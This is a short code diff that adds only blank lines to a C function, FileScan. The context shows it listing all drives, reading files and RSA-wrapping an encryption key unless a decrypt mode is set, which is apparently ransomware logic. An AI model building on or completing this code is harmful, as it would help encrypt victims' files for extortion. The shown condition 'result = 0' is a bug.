@@ -29,6 +29,7 @@ void FileScan(bool decryptMode) {
     int head = 0, tail = 0;
     size_t byteRead;
     unsigned char *buffer;
+    
     HANDLE hFind = INVALID_HANDLE_VALUE;
     DWORD result = GetLogicalDriveStringsA(sizeof(drives), drives);
     if (result = 0) {
@@ -112,6 +113,7 @@ void FileScan(bool decryptMode) {
         head = tail = 0;
         drive += strlen(drive) + 1;
     }
+
     if (!decryptMode) {
         KeyEncrypt(&keyBlob, hRsaKey);
     } else {
